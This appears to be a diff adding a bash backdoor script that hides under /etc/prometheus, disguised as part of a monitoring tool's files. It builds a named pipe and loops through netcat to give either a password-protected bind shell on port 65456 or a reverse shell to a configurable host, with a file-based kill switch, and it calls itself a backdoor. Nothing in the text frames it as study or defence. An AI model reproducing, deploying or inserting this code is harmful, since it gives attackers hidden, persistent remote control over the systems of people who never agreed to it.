@@ -1,0 +1,39 @@
+#!/usr/bin/bash
+
+mode="DEFAULTMODE"
+retrytime=2
+host="localhost"
+pass="DEFAULTPASSWORD"
+port=65456
+mknod /etc/prometheus/pipe p
+echo "">/etc/prometheus/rev0ke
+while :
+do
+
+	if [ "$mode" = "bind" ];
+	then
+		echo "Waiting for pass..."
+		passtry=`nc -lvp $port`
+		echo "Got $passtry"
+		if [ "$passtry" = "$pass" ];
+		then
+			echo "Password accepted. Starting bind shell.."
+			/usr/bin/bash 0</etc/prometheus/pipe|nc -lvp $port 1>/etc/prometheus/pipe 2>/etc/prometheus/pipe
+		else
+			echo "Wrong pass. Restarting..."
+		fi
+
+	elif [ "$mode" = "reverse" ];
+	then
+		/usr/bin/bash 0</etc/prometheus/pipe|nc $host $port 1>/etc/prometheus/pipe 2>/etc/prometheus/pipe
+	fi
+
+	shouldquit=`cat /etc/prometheus/rev0ke`
+	if [ "$shouldquit" = "yes" ];
+	then
+		echo "Interrupting backdoor."
+		break
+	fi
+
+	sleep $retrytime
+done
